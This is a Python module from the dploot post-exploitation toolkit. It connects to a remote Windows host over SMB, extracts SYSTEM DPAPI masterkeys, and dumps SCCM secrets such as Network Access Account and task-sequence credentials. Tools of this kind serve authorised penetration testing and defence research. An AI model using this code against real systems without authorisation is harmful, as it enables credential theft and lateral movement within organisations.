import argparse
import logging
import sys
from typing import Callable, Tuple

from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target, add_target_argument_group
from dploot.lib.utils import handle_outputdir_option
from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
from dploot.triage.sccm import SCCMTriage

NAME = 'sccm'

class SCCMAction:

    def __init__(self, options: argparse.Namespace) -> None:
        self.options = options
        self.target = Target.from_options(options)
        
        self.conn = None
        self._is_admin = None
        self._users = None
        self.outputdir = None
        self.masterkeys = None

        self.outputdir = handle_outputdir_option(dir= self.options.export_sccm)

        if self.options.mkfile is not None:
            try:
                self.masterkeys = parse_masterkey_file(self.options.mkfile)
            except Exception as e:
                logging.error(str(e))
                sys.exit(1)

    def connect(self) -> None:
        self.conn = DPLootSMBConnection(self.target)
        if self.conn.connect() is None:
            logging.error("Could not connect to %s" % self.target.address)
            sys.exit(1)

    def run(self) -> None:
        self.connect()
        logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
        if self.is_admin:
            if self.masterkeys is None:
                triage = MasterkeysTriage(target=self.target, conn=self.conn)
                logging.info("Triage SYSTEM masterkeys\n")
                self.masterkeys = triage.triage_system_masterkeys()
                if not self.options.quiet:
                    for masterkey in self.masterkeys:
                        masterkey.dump()
                    print()

            triage = SCCMTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys, use_wmi=self.options.wmi)
            logging.info('Triage SCCM Secrets\n')
            sccmcreds, sccmtasks, sccmcollections = triage.triage_sccm()
            for sccm_cred in sccmcreds:
                if self.options.quiet:
                    sccm_cred.dump_quiet()
                else:
                    sccm_cred.dump()
            for sccm_task in sccmtasks:
                if self.options.quiet:
                    sccm_task.dump_quiet()
                else:
                    sccm_task.dump()
            for sccm_collection in sccmcollections:
                if self.options.quiet:
                    sccm_collection.dump_quiet()
                else:
                    sccm_collection.dump()
        else:
            logging.info("Not an admin, exiting...")

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin

def entry(options: argparse.Namespace) -> None:
    a = SCCMAction(options)
    a.run()

def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:

    subparser = subparsers.add_parser(NAME, help="Dump SCCM secrets (NAA, Collection variables, tasks sequences credentials)  from remote target")

    group = subparser.add_argument_group("sccm options")

    group.add_argument(
        "-mkfile",
        action="store",
        help=(
            "File containing {GUID}:SHA1 masterkeys mappings"
        ),
    )

    group.add_argument(
        "-export-sccm",
        action="store",
        metavar="DIR_SCCM",
        help=(
            "Dump looted SCCM secrets to specified directory"
        )
    )

    group.add_argument(
        "-wmi",
        action="store_true",
        help=(
            "Dump SCCM secrets from WMI requests results"
        )
    )

    add_target_argument_group(subparser)

    return NAME, entry

